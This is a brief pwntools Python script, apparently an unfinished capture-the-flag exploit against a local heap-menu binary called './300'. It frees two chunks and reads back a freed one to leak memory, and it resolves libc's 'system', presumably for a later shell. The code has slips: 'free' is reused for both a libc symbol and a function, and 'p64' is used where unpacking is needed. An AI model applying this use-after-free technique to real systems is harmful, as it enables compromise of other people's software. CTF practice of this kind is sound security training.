#coding:utf-8
from pwn import *

context.log_level = 'debug'

p = process("./300")
libc = ELF("./libc.so.6")

free = libc.symbols["free"]
system = libc.symbols["system"]


def menu(idx):
	p.sendlineafter("free\n", str(idx))

def add(idx):
	menu(1)
	p.sendlineafter("(0-9)\n", str(idx))
	

def edit(idx, data):
	menu(2)
	p.sendlineafter("(0-9)\n", str(idx))
	p.sendline(data)

def show(idx):
	menu(3)
	p.sendlineafter("(0-9)\n", str(idx))
	data = p.recvline()
	return data

def free(idx):
	menu(4)
	p.sendlineafter("(0-9)", str(idx))

add(1)
add(2)
free(1)
free(2)
print(show(1))
print(p64(show(1)[-7:]))

#add(2)
#edit(1, "")




